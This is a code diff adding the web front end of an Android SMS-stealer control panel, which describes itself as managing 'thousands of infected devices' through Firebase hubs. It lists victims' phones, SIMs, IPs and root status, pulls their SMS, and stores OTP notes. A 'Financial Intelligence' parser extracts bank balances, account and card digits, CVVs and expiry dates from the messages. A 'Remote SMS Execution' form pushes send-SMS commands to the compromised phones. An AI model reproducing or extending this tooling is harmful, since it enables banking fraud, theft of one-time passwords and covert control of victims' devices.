+                    ${ph !== 'Unknown' ? `<button class="d-copy" onclick="event.stopPropagation();copyToClip('${ph}', this)" title="Copy Number">📋</button>` : ''}
+                    ${CAN_EDIT_PHONE ? `<button class="d-edit list-edit-btn" onclick="event.stopPropagation();editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
+                </div>
+            </div>
+            <div class="d-meta">
+                <div class="d-batt" style="color:${bcol}">${esc(d.battery||'—')}</div>
+                <div class="d-src" style="color:${scol}; border-color:${scol}">${d._src[0].toUpperCase()}</div>
+            </div>
+        </div>`;
+    }).join('');
+    document.getElementById('devList').innerHTML = html;
+}
+
+function select(src, id) {
+    selDev = devices.find(d => d._id === id && d._src === src);
+    
+    renderDevList();
+    document.getElementById('mainContent').classList.add('mobile-active');
+    
+    if(curTab==='overview') {
+        document.querySelectorAll('.tab')[1].click(); // jump to device tab
+    } else {
+        renderTab();
+    }
+    fetchMsgs(selDev);
+}
+
+function closeMobilePane() {
+    document.getElementById('mainContent').classList.remove('mobile-active');
+    selDev = null;
+    
+    renderDevList();
+}
+
+async function fetchMsgs(d) {
+    const k = d._src+':'+d._id;
+    if(cache[k]) return;
+    try {
+        let r = await fetch(`/api/messages/${d._src}/${d._id}`, {
+            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
+        });
+        if (r.ok) {
+            let res = await r.json();
+            if (res.success && res.data && res.data.length > 0) {
+                // Ensure local IDs are attached for rendering
+                cache[k] = res.data.map(x => ({ ...x, _localId: Date.now()+Math.random() }));
+                if(curTab==='messages' || curTab==='finance') renderTab(); 
+                return;
+            }
+        }
+    } catch(e) {
+        console.error("Error fetching proxy messages", e);
+    }
+    cache[k] = [];
+    if(curTab==='messages' || curTab==='finance') renderTab();
+}
+
+function setTab(t, btn) {
+    curTab = t;
+    document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    renderTab();
+}
+
+function renderTab(silent = false) {
+    const p = document.getElementById('pane');
+    if (!silent) {
+        p.classList.remove('animate-up'); void p.offsetWidth; p.classList.add('animate-up');
+    }
+    
+    if (curTab === 'overview') {
+        const on = devices.filter(d=>d.status).length;
+        const sms = devices.filter(d=>d.webhookEvent?.sendSms).length;
+        
+        let hubHtml = `<div style="margin-top: 48px; ${silent ? '' : 'animation: fadeUp 0.4s ease forwards;'}">
+            <h3 style="margin-bottom: 24px; font-size: 1.4rem; color: #fff; display: flex; align-items: center; gap: 10px; font-weight: 800; letter-spacing: 0.5px;">🌐 Hub Breakdown <span style="color:var(--text-sec); font-size: 0.9rem; font-weight: 600;">(${SOURCES.length} Attached Databases)</span></h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 16px;">`;
+                
+        SOURCES.forEach(s => {
+            const sDevs = devices.filter(d => d._src === s.key);
+            const sOn = sDevs.filter(d => d.status).length;
+            const pct = devices.length ? Math.round((sDevs.length / devices.length) * 100) : 0;
+            const ratio = sDevs.length ? Math.round((sOn / sDevs.length) * 100) : 0;
+            
+            hubHtml += `
+            <div class="hub-card" onclick="selectDd('${s.key}', '${s.label}', 'src', null); if(window.innerWidth<=768) closeMobilePane();" oncontextmenu="showHubContextMenu(event, '${s.key}')">
+                <!-- Left Section: DB Info -->
+                <div style="display: flex; flex-direction: column; gap: 6px; flex: 1.2;">
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <div style="width: 10px; height: 10px; border-radius: 50%; background: ${s.color}; box-shadow: 0 0 10px ${s.color};"></div>
+                        <div style="font-weight: 700; font-size: 1.1rem; color: #fff;">${esc(s.label)}</div>
+                    </div>
+                    <div style="font-size: 0.7rem; color: var(--text-muted); font-weight: 600; letter-spacing: 1px; text-transform: uppercase;">
+                        ${pct}% Payload Share
+                    </div>
+                </div>
+                
+                <!-- Middle Section: Total Bots -->
+                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 20px; border-left: 1px solid rgba(255,255,255,0.05); border-right: 1px solid rgba(255,255,255,0.05); min-width: 90px;">
+                    <div style="font-size: 1.6rem; font-weight: 800; color: #fff; font-family: var(--font-mono); line-height: 1;">${sDevs.length}</div>
+                    <div style="font-size: 0.65rem; color: var(--text-sec); text-transform: uppercase; letter-spacing: 1px; margin-top: 6px;">Devices</div>
+                </div>
+                
+                <!-- Right Section: Online & Bar -->
+                <div style="display: flex; flex-direction: column; justify-content: center; gap: 8px; flex: 1; padding-left: 8px;">
+                    <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                        <div style="font-size: 0.7rem; color: var(--text-sec); font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Online</div>
+                        <div style="font-size: 1.2rem; font-weight: 700; color: var(--green); font-family: var(--font-mono); line-height: 1;">${sOn}</div>
+                    </div>
+                    <div style="width: 100%; height: 4px; background: rgba(0,0,0,0.3); border-radius: 2px; overflow: hidden;">
+                        <div style="height: 100%; width: ${ratio}%; background: ${s.color}; border-radius: 2px; box-shadow: 0 0 8px ${s.color};"></div>
+                    </div>
+                </div>
+            </div>`;
+        });
+        
+        hubHtml += `</div></div>`;
+        
+        p.innerHTML = `
+        <div class="stats-grid">
+            <div class="stat-card c-cyan"><div class="stat-title">Total Devices</div><div class="stat-value">${devices.length}</div></div>
+            <div class="stat-card c-green"><div class="stat-title">Online</div><div class="stat-value">${on}</div></div>
+            <div class="stat-card c-red"><div class="stat-title">SMS Events</div><div class="stat-value">${sms}</div></div>
+        </div>
+        ${hubHtml}`;
+    }
+    else {
+        if(!selDev) { p.innerHTML = emp('Select a device from the sidebar'); return; }
+        const d = selDev;
+        
+        if (curTab === 'device') {
+            let sh = d.sims?.map((s,i)=>`<div class="detail-row"><span class="d-key">SIM ${i+1}</span>
+                <span class="d-val v-cyan" style="display:flex;align-items:center;gap:8px">
+                    ${esc(s.carrierName)} · ${esc(s.phoneNumber)}
+                    <button class="d-copy" style="opacity:1;position:relative" onclick="copyToClip('${s.phoneNumber}', this)">📋</button>
+                </span></div>`).join('')||'<div class="d-key">No SIM data</div>';
+            p.innerHTML = `
+            <div class="detail-grid">
+                <div class="detail-box">
+                    <h3>📱 Identity</h3>
+                    <div class="detail-row"><span class="d-key">Device ID</span><span class="d-val" style="display:flex;align-items:center;gap:8px">${esc(d._id)}<div id="det-status-dot" class="d-status ${d.status?'on':'off'}" style="position:relative; width:10px; height:10px; border:none; border-radius:50%;" title="${d.status?'Online':'Offline'}"></div></span></div>
+                    <div class="detail-row"><span class="d-key">Phone No.</span>
+                        <span class="d-val v-cyan" style="display:flex;align-items:center;gap:8px">
+                            ${esc(d.customPh || d.mobNo || 'Unknown')}
+                            ${(CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--cyan);color:#000;border-radius:4px;font-size:0.75rem;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
+                            ${CAN_EDIT_PHONE ? `<button class="d-edit" style="opacity:1;position:relative" onclick="editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
+                        </span>
+                    </div>
+                    <div class="detail-row"><span class="d-key">Model</span><span class="d-val">${esc(d.modelName)}</span></div>
+                    <div class="detail-row"><span class="d-key">Android OS</span><span class="d-val">${esc(d.androidV)}</span></div>
+                    <div class="detail-row"><span class="d-key">Status</span><span id="det-status-text" class="d-val ${d.status?'v-green':'v-red'}">${d.status?'Online':'Offline'}</span></div>
+                </div>
+                <div class="detail-box">
+                    <h3>📡 Network & Hardware</h3>
+                    <div class="detail-row"><span class="d-key">IP Address</span><span class="d-val v-amber">${esc(d.ip_address)}</span></div>
+                    <div class="detail-row"><span class="d-key">Carrier</span><span class="d-val">${esc(d.service_provider)}</span></div>
+                    <div class="detail-row"><span class="d-key">Battery</span><span id="det-battery" class="d-val">${esc(d.battery)}</span></div>
+                    <div class="detail-row"><span class="d-key">Rooted</span><span class="d-val ${d.isRoot?'v-red':''}">${d.isRoot?'Yes':'No'}</span></div>
+                </div>
+                <div class="detail-box">
+                    <h3>💳 Telecom & Financial</h3>
+                    ${sh}
+                </div>
+                <div class="detail-box">
+                    <h3>📝 OTP Notes</h3>
+                    <div style="font-size: 0.95rem; color: var(--text-sec); margin-bottom: 12px;" id="otpNoteContent">
+                        ${d.note ? esc(d.note) : '<span style="color:var(--text-muted);font-style:italic">No notes saved...</span>'}
+                    </div>
+                    <div style="display:flex;gap:8px;">
+                        <input type="text" id="otpNoteInput" placeholder="Paste OTP, balance..." style="flex:1;padding:8px 12px;border-radius:var(--radius-sm);background:var(--bg-panel);border:1px solid var(--border);color:var(--text-main);outline:none;">
+                        <button class="btn primary" onclick="saveOtpNote()">Save</button>
+                    </div>
+                </div>
+            </div>`;
+        }
+        else if (curTab === 'messages') {
+            const msgs = cache[d._src+':'+d._id];
+            if(!msgs) { 
+                p.innerHTML = `<div class="empty-state"><div class="spinner"></div><div>Extracting Messages...</div></div>`; 
+                fetchMsgs(selDev);
+                return; 
+            }
+            
+            p.innerHTML = `
+            <div class="msg-header-bar">
+                <div class="mhb-left">
+                    <div class="mhb-title">${esc(d._id)}</div>
+                    <div class="mhb-badge">${msgs.length} MSGS</div>
+                </div>
+                <button class="btn primary" onclick="cache['${d._src}:${d._id}']=null;fetchMsgs(selDev)">↻ Force Sync</button>
+            </div>
+            <div class="msg-filters">
+                <input type="text" id="mSearch" placeholder="Search keywords, OTPs, senders..." oninput="renderMList()">
+                <button class="mf-btn ${mf==='all'?'active':''}" onclick="mf='all';renderTab()">All</button>
+                <button class="mf-btn ${mf==='in'?'active':''}" onclick="mf='in';renderTab()">Inbox</button>
+                <button class="mf-btn ${mf==='out'?'active':''}" onclick="mf='out';renderTab()">Sent</button>
+            </div>
+            <div class="chat-list" id="mList"></div>`;
+            renderMList();
+        }
+        else if (curTab === 'finance') {
+            const msgs = cache[d._src+':'+d._id];
+            if(!msgs) { 
+                p.innerHTML = `<div class="empty-state"><div class="spinner"></div><div>Extracting SMS Corpus for Financial Analysis...</div></div>`; 
+                fetchMsgs(selDev);
+                return; 
+            }
+            
+            // Run the Financial Intelligence Parser
+            const parsedBankMsgs = [];
+            let totalBal = 0;
+            let cardsFound = 0;
+            
+            msgs.forEach(m => {
+                const parsed = parseFinancialSms(m.message || m.body || '', m.sender || m.address || '');
+                if (parsed) {
+                    // 3-Month Date Filter
+                    const msgDateStr = m.dateTime || m.date || '';
+                    if (msgDateStr) {
+                        const msgDate = new Date(msgDateStr);
+                        const threeMonthsAgo = new Date();
+                        threeMonthsAgo.setMonth(threeMonthsAgo.getMonth() - 3);
+                        if (msgDate < threeMonthsAgo) return; // Skip if older than 3 months
+                    }
+
+                    parsed.rawMsg = m;
+                    parsedBankMsgs.push(parsed);
+                    if (parsed.isCardAlert && parsed.cardLast4) cardsFound++;
+                    
+                    // Simple logic to try and guess total liquid balance (takes highest recent balance from unique banks)
+                    if (parsed.availableBalance) {
+                        const balNum = parseFloat(parsed.availableBalance);
+                        if (!isNaN(balNum)) totalBal += balNum; // For demonstration, simple sum
+                    }
+                }
+            });
+            
+            if (parsedBankMsgs.length === 0) {
+                p.innerHTML = emp('No financial intelligence (Bank/Card data) detected in SMS logs.');
+                return;
+            }
+            
+            // Build the Financial Intelligence UI Dashboard
+            p.innerHTML = `
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; padding-bottom:16px; border-bottom:1px solid rgba(255,255,255,0.1);">
+                <div>
+                    <h3 style="font-size: 1.5rem; color: var(--text-main); font-weight: 800; display:flex; align-items:center; gap:10px;">
+                        💳 Financial Intelligence
+                    </h3>
+                    <div style="font-size: 0.85rem; color: var(--text-sec); margin-top: 4px;">Automated extraction of bank balances, transactions, and credit cards.</div>
+                </div>
+                <div style="display:flex; gap:16px;">
+                    <div style="background: rgba(0, 240, 255, 0.05); border: 1px solid rgba(0, 240, 255, 0.2); padding: 12px 20px; border-radius: var(--radius-sm); text-align:right;">
+                        <div style="font-size:0.7rem; font-weight:700; color:var(--cyan); letter-spacing:1px; text-transform:uppercase;">Extracted Events</div>
+                        <div style="font-size:1.4rem; font-family:var(--font-mono); font-weight:800; color:#fff;">${parsedBankMsgs.length}</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="chat-list" style="display:grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap:16px;">
+                ${parsedBankMsgs.map(data => {
+                    const isCredit = data.transactionType === 'credit';
+                    const isDebit = data.transactionType === 'debit';
+                    const amtColor = isCredit ? 'var(--green)' : isDebit ? 'var(--red)' : 'var(--text-main)';
+                    const amtPrefix = isCredit ? '+' : isDebit ? '-' : '';
+                    
+                    return `
+                    <div style="background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius-md); padding:16px; display:flex; flex-direction:column; gap:12px; transition:var(--trans);" onmouseover="this.style.borderColor='var(--cyan)'" onmouseout="this.style.borderColor='var(--border)'">
+                        <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+                            <div style="display:flex; align-items:center; gap:8px;">
+                                <div style="width:32px; height:32px; border-radius:8px; background:var(--bg-panel); border:1px solid var(--border-light); display:flex; align-items:center; justify-content:center; font-size:1.2rem;">
+                                    ${data.isCardAlert ? '💳' : '🏦'}
+                                </div>
+                                <div>
+                                    <div style="font-weight:700; color:var(--text-main); font-size:1.1rem;">${esc(data.bankName)}</div>
+                                    <div style="font-size:0.75rem; color:var(--text-muted); font-family:var(--font-mono);">${esc(data.rawMsg.dateTime || data.rawMsg.date || '')}</div>
+                                </div>
+                            </div>
+                            <div style="text-align:right;">
+                                ${data.availableBalance ? `<div style="font-size:0.7rem; color:var(--text-sec); text-transform:uppercase; font-weight:700;">Avail. Balance</div><div style="font-family:var(--font-mono); font-weight:800; color:var(--cyan); font-size:1.1rem;">₹${esc(data.availableBalance)}</div>` : ''}
+                            </div>
+                        </div>
+                        
+                        <div style="display:flex; flex-wrap:wrap; gap:8px; background:rgba(0,0,0,0.2); padding:12px; border-radius:var(--radius-sm); border:1px solid rgba(255,255,255,0.02);">
+                            ${data.transactionAmount ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Transaction</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:${amtColor};">${amtPrefix}₹${esc(data.transactionAmount)}</div></div>` : ''}
+                            ${data.accountLast4 ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">A/C Last 4</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--text-main);">*${esc(data.accountLast4)}</div></div>` : ''}
+                            ${data.cardType ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Card Type</div><div style="font-weight:700; font-size:0.95rem; color:var(--text-main);">${esc(data.cardType)}</div></div>` : ''}
+                            ${data.cardLast4 ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Card Last 4</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--text-main);">*${esc(data.cardLast4)}</div></div>` : ''}
+                            ${data.cvv ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">CVV Found</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--amber);">${esc(data.cvv)}</div></div>` : ''}
+                            ${data.expiry ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Expiry Found</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--amber);">${esc(data.expiry)}</div></div>` : ''}
+                        </div>
+                        
+                        <div style="margin-top:auto; font-size:0.85rem; color:var(--text-sec); line-height:1.4; border-top:1px dashed rgba(255,255,255,0.1); padding-top:12px;">
+                            ${esc(data.rawMsg.message || data.rawMsg.body || '')}
+                        </div>
+                    </div>
+                    `;
+                }).join('')}
+            </div>`;
+        }
+        else if (curTab === 'sendsms') {
+            p.innerHTML = `
+            <div class="form-panel">
+                <div class="form-title">Remote SMS Execution</div>
+                <div class="form-sub">Device: <span style="color:var(--cyan);font-family:var(--font-mono);font-weight:700;">${esc(d._id)}</span></div>
+                
+                <div class="sim-grid">
+                    <div class="sim-card ${selSim===1?'active':''}" onclick="selSim=1;renderTab()">
+                        <div class="sim-title">SIM 1</div>
+                        <div class="sim-num">${esc(d.sims?.[0]?.phoneNumber||'Unknown')}</div>
+                    </div>
+                    <div class="sim-card ${selSim===2?'active':''}" onclick="selSim=2;renderTab()">
+                        <div class="sim-title">SIM 2</div>
+                        <div class="sim-num">${esc(d.sims?.[1]?.phoneNumber||'Unknown')}</div>
+                    </div>
+                </div>
+
+                <div class="f-group">
+                    <label class="f-label">Device Phone Number</label>
+                    <input type="text" class="f-input" id="smsTo" placeholder="+91...">
+                </div>
+                
+                <div class="f-group">
+                    <label class="f-label">Payload Message (Uses <span style="color:var(--cyan)">[ID]</span> placeholder)</label>
+                    <textarea class="f-input f-area" id="smsMsg" placeholder="Type SMS content..."></textarea>
+                </div>
+
+                <button class="btn-send" onclick="execSMS()">EXECUTE PAYLOAD VIA SIM ${selSim}</button>
+            </div>`;
+        }
+    }
+}
+
+function renderMList() {
+    const d = selDev;
+    let msgs = cache[d._src+':'+d._id] || [];
+    const q = (document.getElementById('mSearch')?.value||'').toLowerCase();
+    
+    if(mf==='in') msgs = msgs.filter(m=>m.type==='incoming');
+    if(mf==='out') msgs = msgs.filter(m=>m.type==='outgoing');
+    if(q) msgs = msgs.filter(m => `${m.sender} ${m.message}`.toLowerCase().includes(q));
+
+    const html = [...msgs].reverse().slice(0,200).map(m => {
+        const isOut = m.type === 'outgoing';
+        return `
+        <div class="chat-msg">
+            <div class="chat-head">
+                <div class="chat-sender">${esc(m.sender||m.address||'Unknown')}</div>
+                <div class="chat-badge ${isOut?'out':'in'}">${isOut?'SENT':'INBOX'}</div>
+                <div class="chat-time">${esc(m.dateTime||m.date||'')}</div>
+                <div class="chat-delete" onclick="promptDeleteMsg('${m._localId}')" style="margin-left:auto; width:24px; height:24px; border-radius:4px; display:flex; align-items:center; justify-content:center; color:rgba(255,255,255,0.3); cursor:pointer; background:rgba(255,255,255,0.05); font-size:0.8rem; transition:var(--trans);" onmouseover="this.style.background='rgba(239, 68, 68, 0.2)'; this.style.color='var(--red)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'; this.style.color='rgba(255,255,255,0.3)'">✕</div>
+            </div>
+            <div class="chat-body">${esc(m.message||m.body||'')}</div>
+        </div>`;
+    }).join('');
+    
+    document.getElementById('mList').innerHTML = html || emp('No messages match criteria');
+}
+
+async function execSMS() {
+    const to = document.getElementById('smsTo').value;
+    const msg = document.getElementById('smsMsg').value;
+    if(!to || !msg) return customAlert('Missing Fields', 'Please fill in both the target phone number and payload message.');
+    
+    const finalMsg = msg.replace(/\[ID\]/g, selDev._id);
+    const payload = { from: selSim, to, message: finalMsg, isSended: false };
+    const p = `/clients/${selDev._id}/webhookEvent/sendSms.json`;
+    const src = SOURCES.find(s => s.key === selDev._src);
+    const token = src ? await getAuthToken(src) : null;
+    const authSuffix = token ? `?auth=${token}` : '';
+    
+    try {
+        await fetch(selDev._base + p + authSuffix, { method: 'PUT', body: JSON.stringify(payload) });
+        customAlert('Payload Staged', `The SMS command was successfully written to the device.\n\nFinal Payload:\n"${finalMsg}"`);
+    } catch(e) { customAlert('Execution Failed', 'Failed to stage the SMS payload. Target might be offline or unreachable.'); }
+}
+
+// --- FINANCIAL INTELLIGENCE PARSER ---
+function parseFinancialSms(text, sender) {
+    if (!text || text.trim().length < 8) return null;
+    const upperText = text.toUpperCase();
+    
+    // Quick filter to see if it even looks like a financial message
+    const isFin = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE|CARD|CVV|CREDIT|DEBIT/.test(upperText);
+    
+    // Strict filter to ignore OTPs, login verification, or sign-up texts
+    const isOTP = /OTP|VERIFICATION|CODE|PIN|PASSWORD|SIGN-UP|LOGIN/i.test(upperText);
+    
+    if (!isFin || isOTP) return null;
+    
+    let result = {
+        bankName: null,
+        availableBalance: null,
+        transactionAmount: null,
+        transactionType: null, // 'credit' or 'debit'
+        accountLast4: null,
+        cardLast4: null,
+        cardType: null,
+        cvv: null,
+        expiry: null,
+        isBankAlert: false,
+        isCardAlert: false
+    };
+
+    // 1. Identify Bank
+    for (const [regex, bank] of BANK_NAMES) {
+        if (regex.test(text) || regex.test(sender)) {
+            result.bankName = bank;
+            result.isBankAlert = true;
+            break;
+        }
+    }
+    
+    // Fallback: If no bank name matched but it has a sender ID format (e.g. AD-HDFCBK)
+    if (!result.bankName && /^[A-Z]{2}-[A-Z0-9]+$/.test(sender)) {
+        const parts = sender.match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
+        if (parts && parts[1]) result.bankName = parts[1];
+    }
+
+    // 2. Extract Available Balance
+    for (const regex of BAL_REGEX) {
+        const match = text.match(regex);
+        if (match && match[1]) {
+            const amt = match[1].replace(/,/g, "");
+            if (parseFloat(amt) >= 0) {
+                result.availableBalance = amt;
+                result.isBankAlert = true;
+                break;
+            }
+        }
+    }
+
+    // 3. Extract Transaction Amount & Type
+    for (const regex of TXN_REGEX) {
+        const match = text.match(regex);
+        if (match && match[1]) {
+            const amt = match[1].replace(/,/g, "");
+            if (amt !== result.availableBalance) {
+                result.transactionAmount = amt;
+                break;
+            }
+        }
+    }
+    
+    if (/credit(?:ed)?/i.test(text)) result.transactionType = "credit";
+    else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) result.transactionType = "debit";
+
+    // 4. Extract Account Number
+    for (const regex of ACC_REGEX) {
+        const match = text.match(regex);
+        if (match && match[1]) {
+            result.accountLast4 = match[1].replace(/[^0-9]/g, "").slice(-4);
+            break;
+        }
+    }
+
+    // 5. Card Intel
+    if (upperText.includes("CARD") || upperText.includes("CVV") || upperText.includes("CREDIT") || upperText.includes("DEBIT")) {
+        result.isCardAlert = true;
+        
+        // Card Last 4
+        for (const regex of CARD_REGEX) {
+            const match = text.match(regex);
+            if (match && match[1]) {
+                const num = match[1].replace(/[^0-9]/g, "");
+                if (num.length >= 4) {
+                    result.cardLast4 = num.slice(-4);
+                    break;
+                }
+            }
+        }
+        
+        // Card Type
+        if (/VISA/i.test(text)) result.cardType = "VISA";
+        else if (/MASTER(?:CARD)?/i.test(text)) result.cardType = "Mastercard";
+        else if (/RUPAY/i.test(text)) result.cardType = "RuPay";
+        else if (/AMEX|AMERICAN EXPRESS/i.test(text)) result.cardType = "Amex";
+        else if (/credit/i.test(text)) result.cardType = "Credit Card";
+        else if (/debit/i.test(text)) result.cardType = "Debit Card";
+
+        // CVV
+        for (const regex of CVV_REGEX) {
+            const match = text.match(regex);
+            if (match && match[1]) {
+                result.cvv = match[1];
+                break;
+            }
+        }
+
+        // Expiry
+        for (const regex of EXP_REGEX) {
+            const match = text.match(regex);
+            if (match && match[1]) {
+                result.expiry = match[1];
+                break;
+            }
+        }
+    }
+
+    // Only return if we found *something* useful
+    if (result.isBankAlert || result.isCardAlert) {
+        if (!result.bankName) result.bankName = "Unknown Bank";
+        return result;
+    }
+    
+    return null;
+}
+
+function esc(s) { if(s==null) return ''; const d=document.createElement('div'); d.textContent=String(s); return d.innerHTML; }
+function emp(msg) { 
+    return `<div class="empty-state" style="display:flex; flex-direction:column; align-items:center; justify-content:center; padding: 40px 20px; background: rgba(0,240,255,0.02); border: 1px dashed rgba(0,240,255,0.2); border-radius: var(--radius-lg); margin: 20px;">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="rgba(0,240,255,0.5)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 16px;"><path d="M12 22a10 10 0 1 0 0-20 10 10 0 0 0 0 20z"></path><circle cx="12" cy="12" r="4"></circle><path d="M12 12v-9"></path></svg>
+        <div style="font-size: 1.1rem; font-weight: 700; color: var(--text-main); margin-bottom: 4px; letter-spacing:0.5px;">No Matches Found</div>
+        <div style="font-size: 0.9rem; color: var(--text-sec); text-align: center;">${msg}</div>
+    </div>`; 
+}
+
+function copyToClip(text, btnEl) {
+    const doAnim = () => {
+        if (btnEl) {
+            const orig = btnEl.innerText;
+            btnEl.innerText = '✅';
+            setTimeout(() => { btnEl.innerText = orig; }, 1000);
+        }
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(doAnim).catch(e => { fallbackCopy(text); doAnim(); });
+    } else {
+        fallbackCopy(text); doAnim();
+    }
+}
+function fallbackCopy(text) {
+    const t = document.createElement('textarea');
+    t.value = text; document.body.appendChild(t); t.select();
+    try { document.execCommand('copy'); } catch(e) {} document.body.removeChild(t);
+}
+
+async function saveOtpNote() {
+    if (!selDev) return;
+    const note = document.getElementById('otpNoteInput').value.trim();
+    if (!note) return;
+    const src = SOURCES.find(s => s.key === selDev._src);
+    const token = src ? await getAuthToken(src) : null;
+    const authSuffix = token ? `?auth=${token}` : '';
+
+    const paths = [`/clients/${selDev._id}/note.json`, `/${selDev._id}/note.json`];
+    for (const p of paths) {
+        try {
+            const res = await fetch(selDev._base + p + authSuffix, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(note)
+            });
+            if (res.ok) {
+                selDev.note = note;
+                document.getElementById('otpNoteContent').textContent = note;
+                document.getElementById('otpNoteInput').value = '';
+                break;
+            }
+        } catch(e) {}
+    }
+}
+
+let promptCallback = null;
+function customPrompt(title, desc, defaultVal, callback) {
+    document.getElementById('promptTitle').textContent = title;
+    document.getElementById('promptDesc').textContent = desc;
+    const input = document.getElementById('promptInput');
+    input.value = defaultVal || '';
+    promptCallback = callback;
+    document.getElementById('promptModal').classList.add('active');
+    input.focus();
+}
+function closePrompt() { document.getElementById('promptModal').classList.remove('active'); }
+function cancelPrompt() {
+    closePrompt();
+    if (promptCallback) promptCallback(null);
+}
+function submitPrompt() {
+    closePrompt();
+    if (promptCallback) promptCallback(document.getElementById('promptInput').value);
+}
+
+function showSystemCapabilities() {
+    const specsHtml = `
+        <style>
+            .specs-scroll::-webkit-scrollbar { width: 4px; }
+            .specs-scroll::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); border-radius: 4px; }
+            .specs-scroll::-webkit-scrollbar-thumb { background: rgba(0,240,255,0.3); border-radius: 4px; }
+            .specs-scroll::-webkit-scrollbar-thumb:hover { background: rgba(0,240,255,0.6); }
+        </style>
+        <div class="specs-scroll" style="text-align: left; background: #0b1120; border: 1px solid rgba(0,240,255,0.15); padding: 24px; border-radius: 12px; margin-bottom: 24px; max-height: 380px; overflow-y: auto; box-shadow: inset 0 2px 20px rgba(0,0,0,0.5), 0 10px 30px rgba(0,0,0,0.8);">
+            <div style="font-size: 0.8rem; color: var(--cyan); text-transform: uppercase; letter-spacing: 2px; font-weight: 800; margin-bottom: 20px; border-bottom: 1px solid rgba(0,240,255,0.1); padding-bottom: 10px; display: flex; align-items: center; gap: 8px;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                Core Specifications
+            </div>
+            <ul style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 16px;">
+                <li style="display: flex; gap: 12px; align-items: flex-start; background: rgba(255,255,255,0.02); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">
+                    <div style="background: rgba(168, 85, 247, 0.1); color: var(--purple); padding: 6px; border-radius: 8px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 10px rgba(168, 85, 247, 0.2);">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
+                    </div>
+                    <div>
+                        <div style="color: #fff; font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; letter-spacing: 0.5px;">Multi-Payload Aggregation</div>
+                        <div style="color: var(--text-sec); font-size: 0.85rem; line-height: 1.5;">Connect multiple Firebase hubs simultaneously. Manage thousands of infected devices from a single master dashboard seamlessly.</div>
+                    </div>
+                </li>
+                <li style="display: flex; gap: 12px; align-items: flex-start; background: rgba(255,255,255,0.02); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">
+                    <div style="background: rgba(245, 158, 11, 0.1); color: var(--amber); padding: 6px; border-radius: 8px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 10px rgba(245, 158, 11, 0.2);">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    </div>
+                    <div>
+                        <div style="color: #fff; font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; letter-spacing: 0.5px;">Zero-Knowledge Encryption</div>
+                        <div style="color: var(--text-sec); font-size: 0.85rem; line-height: 1.5;">All payload configurations and API keys are encrypted locally using AES-256 in your browser. The vault is cryptographically sealed without the Master Password.</div>
+                    </div>
+                </li>
